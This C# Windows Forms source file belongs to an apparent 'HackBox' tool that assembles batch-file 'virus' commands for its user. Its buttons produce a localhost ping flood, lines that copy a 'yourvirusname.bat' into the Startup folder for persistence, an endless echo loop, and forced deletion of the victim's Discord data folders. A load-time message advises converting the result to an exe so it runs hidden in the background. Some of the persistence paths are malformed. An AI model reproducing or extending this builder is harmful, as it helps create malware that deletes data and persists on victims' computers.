using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HackBox
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
			
	
		}

		private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
		{

		}

		private void button1_Click(object sender, EventArgs e)
		{
			string selfdos = "ping -t -l 3000 127.0.0.1";
			listBox1.Items.Add(selfdos);

		}

		private void Form1_Load(object sender, EventArgs e)
		{
			MessageBox.Show("You need to download BAT TO EXE CONVERTER to compile these better and make them background process!");
			
		}

		private void button2_Click(object sender, EventArgs e)
		{
			string start = @"copy %USERPROFILE%\Desktop\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup ";
			string start2 = @"copy %USERPROFILE%\Downloads\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
			string start3 = @"copy %USERPROFILE%\Documents\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
			string start4 = @"copy %USERPROFILE%\Pictures\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
			string start5 = @"copy %USERPROFILE%\Videos\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
			string start6 = @"copy %USERPROFILE%\Music\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
			listBox1.Items.Add(start);
			listBox1.Items.Add(start2);
			listBox1.Items.Add(start3);
			listBox1.Items.Add(start4);
			listBox1.Items.Add(start5);
			listBox1.Items.Add(start6);

		}

		private void button3_Click(object sender, EventArgs e)
		{
			string mine = " :mine";
			string mine2 = "echo %random%%random%";
			string mine3 = "goto mine";
			listBox1.Items.Add(mine);
			listBox1.Items.Add(mine2);
			listBox1.Items.Add(mine3);

		}

		private void button4_Click(object sender, EventArgs e)
		{
			string del = @"del /q /f %appdata%\Discord";
			string del2 = @"del /q /f %localappdata%\discord";
			listBox1.Items.Add(del);
			listBox1.Items.Add(del2);
		}

		private void button5_Click(object sender, EventArgs e)
		{

		}

		private void button5_Click_1(object sender, EventArgs e)
		{
			this.Hide();
			Form2 penis = new Form2();
			penis.ShowDialog();
			this.Close();
		}
	}
}


